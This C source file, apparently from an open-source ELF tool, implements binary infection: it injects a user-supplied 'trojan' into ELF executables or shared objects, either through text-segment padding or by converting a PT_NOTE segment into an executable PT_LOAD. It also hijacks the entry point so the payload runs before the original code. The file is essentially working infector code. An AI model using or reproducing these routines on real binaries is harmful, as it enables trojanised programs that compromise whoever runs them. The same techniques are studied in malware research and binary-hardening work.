/**
 *  MIT License
 *
 *  Copyright (c) 2021 Carlos Carvalho
 *
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *
 *  The above copyright notice and this permission notice shall be included in all
 *  copies or substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 *  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 *  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 *  SOFTWARE.
 */

#include "common.h"
#include "utils.h"
#include "log.h"
#include "elfo.h"
#include "parse.h"
#include "infect.h"
#include <assert.h>

/**
 *  Check if the room we find to inject user's trojan
 *  is empty (zeroes)
 */
static bool _inf_check_padding(unsigned char *buf, size_t len) {
    unsigned char zeroes[len];
    memset(zeroes, 0, len);
    if (!memcmp(zeroes, buf, len))
        return true;
    return false;
}

/**
 * Find the magic address that will
 * be replaced by valid one
 */
static long *_inf_get_inf_magik(uint8_t *trojan, size_t len, long match)
{
    uint8_t *ptr = trojan;
    for (int i=0 ; i < len ; ++i) {
        long curr = *((long *)&ptr[i]);
        /** is it the same? */
        if (!(match ^ curr))
            return (long*)&ptr[i];
    }
    return NULL;
}

/** Locate and set injection offsets */
static elf_off_t _inf_set_pad(infect_t *inf, elf_phdr_t *text, elf_phdr_t *data) {
    elf_off_t rv = (elf_off_t)0;

    inf->lsb.target_offset = text->p_offset + text->p_filesz;
    /** If ELF is .so = ehdr->e_type */
    inf->lsb.lsb_so_addr = inf->lsb.target_offset;
    /** If ELF is EXEC = ehdr->e_type, p_filesz: Size of segment in disk */
    inf->lsb.lsb_exec_addr = text->p_vaddr + text->p_filesz;

    /** Total padding size (zeroes) between .text and .data */
    if (data)
        rv = (data->p_offset - inf->lsb.lsb_so_addr);

    return rv;
}

infect_t *inf_load(elf_t *elfo, open_mode_t m, long magic, struct mapped_file *map) {
    ASSERT_ARG_RET_NULL(elfo);
    ASSERT_CON_RET_NULL(m == F_RW);
    ASSERT_CON_RET_NULL(map);

    long *magic_ptr = _inf_get_inf_magik((uint8_t*)map->heap,
            map->st.st_size, magic);
    if (!magic_ptr) {
        log_error("Magic not found\n");
        return NULL;
    }

    infect_t *inf = scalloc(1, sizeof(infect_t));
    inf->elfo = elfo;
    inf->magic_ptr = magic_ptr;
    inf->trojan_size = map->st.st_size;
    inf->trojan = map->heap;

    return inf;
}

elf_off_t inf_scan_segment(infect_t *inf) {
    ASSERT_ARG_RET_VAL(inf && inf->elfo, 0);

    bool pass_check = false;

    int nr = inf->elfo->phmap[LAZY_PT_LOAD].nr;
    if (nr != 2 && nr != 4) {
        log_error("Unexpected number of PT_LOAD sections: %d\n", nr);
        return (elf_off_t)0;
    }

    elf_phdr_t *text = NULL;
    elf_phdr_t *data = NULL;

    if (nr == 2) {
#pragma message "Fixme: PT_LOAD number"
        int idx0 = inf->elfo->phmap[LAZY_PT_LOAD].map[0];
        int idx1 = inf->elfo->phmap[LAZY_PT_LOAD].map[1];
        elf_word_t flags0 = inf->elfo->phdrs[idx0]->p_flags;
        elf_word_t flags1 = inf->elfo->phdrs[idx1]->p_flags;

        if (flags0 == (PF_R|PF_X) && flags1 == (PF_R|PF_W)) { /** .text,.data */
            text = inf->elfo->phdrs[idx0];
            data = inf->elfo->phdrs[idx1];
        } else if (flags0 == (PF_R|PF_W) && flags1 == (PF_R|PF_X)) { /** .data,.text */
            text = inf->elfo->phdrs[idx1];
            data = inf->elfo->phdrs[idx0];
        }
    } else {
        for (int i = 0; i < nr; ++i) {
            elf_word_t flags = inf->elfo->phdrs[i]->p_flags;
            if (flags == (PF_R|PF_X))
                text = inf->elfo->phdrs[i];
            if (text) {
                data = inf->elfo->phdrs[i+1];
                break;
            }
        }
    }

    if (!text) {
        log_error("Wait!? Unexpected loadable segment\n");
        return (elf_off_t)0;
    }

    elf_off_t len = _inf_set_pad(inf, text, data);
    if (len < inf->trojan_size) {
        log_error("No available space for infection, not written\n");
        return false;
    }

    /** must be only zeroes :) */
    if (_inf_check_padding((unsigned char*)inf->elfo->mapaddr +
                inf->lsb.target_offset, len) == true) {
        /** Update to the new mem & file size */
        text->p_memsz = text->p_memsz + inf->trojan_size;
        text->p_filesz = text->p_filesz + inf->trojan_size;
        pass_check = true;
    } else {
        log_error("Error: Invalid padding - not all zeroes\n");
        dump_buff_hex((unsigned char *)inf->elfo->mapaddr + inf->lsb.target_offset, len);
        printf("\n");
    }

    return (pass_check ? len : 0);
}

bool inf_load_and_patch(infect_t *inf) {
    ASSERT_CON_RET_FALSE(inf && inf->elfo);

    elf_ehdr_t *ehdr = inf->elfo->ehdr;

    elf_off_t curr_sct_offset = 0;
    elf_shdr_t **shdrs = inf->elfo->shdrs;

    /** Save original entry point and re-write new one to ehdr */
    inf->lsb.o_entry = ehdr->e_entry;
    if (ehdr->e_type == ET_EXEC)
        ehdr->e_entry = inf->lsb.lsb_exec_addr;
    else if (ehdr->e_type == ET_DYN)
        ehdr->e_entry = inf->lsb.lsb_so_addr;

    for (int i = 0; i < SHNUM(inf->elfo); ++i, (*shdrs)++) {
        elf_shdr_t *shdr = *shdrs;
        curr_sct_offset = shdr->sh_offset + shdr->sh_size;

        if (inf->lsb.target_offset == curr_sct_offset) {
            shdr->sh_size = shdr->sh_size + inf->trojan_size;
            break;
        }
    }

    /** All good! */
    *(inf->magic_ptr) = inf->lsb.o_entry;
    unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + inf->lsb.target_offset;
    memcpy(dest, inf->trojan, inf->trojan_size);

    return true;
}

/** Find and return the larger SHT_NOTE section, if any */
static elf_shdr_t *_inf_get_largest_note(infect_t *inf, elf_word_t max) {
    elf_t *e = inf->elfo;
    elf_shdr_t *rv = NULL;

    for (int i = 0; i < e->shmap[LAZY_SHT_NOTE].nr && !rv; ++i) {
        int idx = e->shmap[LAZY_SHT_NOTE].map[i];
        if (e->shdrs[idx]->sh_size == max)
            rv = e->shdrs[idx];
    }
    return rv;
}


elf_xword_t inf_note_has_room_for_payload(infect_t *inf) {
    elf_t *e = inf->elfo;
    elf_xword_t max = 0;

    for (int i = 0; i < e->shmap[LAZY_SHT_NOTE].nr; ++i) {
        int idx = e->shmap[LAZY_SHT_NOTE].map[i];
        if (e->shdrs[idx]->sh_size >= inf->trojan_size)
            max = e->shdrs[idx]->sh_size;
    }

    if (!max)
        log_info("Error: no space for trojan\n");

    return max;
}

bool inf_note_patch(infect_t *inf, elf_xword_t max) {
    ASSERT_ARG_RET_FALSE(inf);
    ASSERT_ARG_RET_FALSE(max > 0);
    ASSERT_CON_RET_FALSE(inf->elfo);

    /**
     * Find out if we have enough space for infection
     * in one of SHT_NOTE sections, if any
     */
    elf_shdr_t *sht_note = _inf_get_largest_note(inf, max);
    if (!sht_note) {
        log_error("Error: No available .note section\n");
        return false;
    }

    /** For now accept only when we have only one PT_NOTE */
    int nr_note = inf->elfo->phmap[LAZY_PT_NOTE].nr;
    if (nr_note != 1) {
        log_error("Wait! Have we been here before?\n");
        return false;
    }

    int ph_note_idx = inf->elfo->phmap[LAZY_PT_NOTE].map[0];
    elf_phdr_t *phdr = inf->elfo->phdrs[ph_note_idx];

    /** Move virtual address way ahead so
     * it won't hit others, hopefully!
     */
    sht_note->sh_addr = sht_note->sh_offset + 0x400000;

    sht_note->sh_type = SHT_PROGBITS;

    /** Executable */
    sht_note->sh_flags = SHF_ALLOC | SHF_EXECINSTR;
    sht_note->sh_addralign = 16;
    sht_note->sh_size = inf->trojan_size;

    /**
     * Turn PT_NOTE program into PT_LOAD
     * and set entry points
     */
    phdr->p_type = PT_LOAD;
    phdr->p_filesz = inf->trojan_size;
    phdr->p_memsz = inf->trojan_size;
    phdr->p_offset = sht_note->sh_offset;
    phdr->p_flags = (PF_R|PF_X);
    phdr->p_vaddr =  sht_note->sh_addr;
    phdr->p_align = 0x1000;

    /** All good! */
    *(inf->magic_ptr) = inf->elfo->ehdr->e_entry;
    inf->elfo->ehdr->e_entry = sht_note->sh_addr;
    unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + sht_note->sh_offset;
    /** Inject trojan into cozy SHT_NOTE section */
    memcpy(dest, inf->trojan, inf->trojan_size);

    return true;
}



